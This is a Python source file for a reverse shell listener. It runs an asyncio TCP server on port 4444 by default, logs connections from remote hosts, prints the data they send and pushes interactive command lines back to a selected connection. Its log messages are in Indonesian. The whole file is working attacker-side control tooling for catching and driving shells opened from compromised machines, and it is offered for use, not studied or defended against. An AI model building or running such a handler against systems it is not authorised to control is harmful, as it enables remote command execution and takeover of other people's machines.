"""Reverse shell listener: TCP listener job that logs incoming connections,
prints received data, and can send follow-up commands interactively."""
from __future__ import annotations

import asyncio


class ReverseListener:
    def __init__(self, host: str = "0.0.0.0", port: int = 4444, log=print) -> None:
        self.host = host
        self.port = port
        self.log = log
        self.connections: dict[str, asyncio.StreamWriter] = {}
        self.server: asyncio.Server | None = None
        self.active_id: str | None = None
        self._stop = asyncio.Event()

    async def start(self) -> None:
        self.server = await asyncio.start_server(self._handle, self.host, self.port)
        addrs = ", ".join(str(s.getsockname()) for s in self.server.sockets)
        self.log(f"[*] listener aktif di {addrs} — tunggu koneksi masuk...")
        async with self.server:
            await self._stop.wait()
        self.log("[*] listener ditutup")

    async def stop(self) -> None:
        self._stop.set()
        if self.server:
            self.server.close()
            await self.server.wait_closed()
        for wid, w in list(self.connections.items()):
            try:
                w.close()
            except Exception:
                pass
        self.connections.clear()

    async def _handle(self, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername")
        cid = f"{peer[0]}:{peer[1]}"
        self.connections[cid] = writer
        self.active_id = cid
        self.log(f"[+] koneksi baru dari {cid} (aktif: {cid})")
        try:
            while True:
                data = await reader.readline()
                if not data:
                    break
                text = data.decode("utf-8", "replace").rstrip()
                if text:
                    self.log(f"[{cid}] {text}")
        except (ConnectionResetError, asyncio.IncompleteReadError):
            pass
        finally:
            self.log(f"[-] koneksi {cid} terputus")
            self.connections.pop(cid, None)
            if self.active_id == cid:
                self.active_id = next(iter(self.connections), None)
            try:
                writer.close()
            except Exception:
                pass

    async def send_command(self, command: str, conn_id: str | None = None) -> int:
        """Send one command line to a connection; returns count sent."""
        cid = conn_id or self.active_id
        if not cid or cid not in self.connections:
            self.log("[!] tidak ada koneksi aktif")
            return 0
        writer = self.connections[cid]
        try:
            writer.write((command + "\n").encode())
            await writer.drain()
            return 1
        except Exception as e:
            self.log(f"[!] gagal kirim ke {cid}: {e}")
            return 0
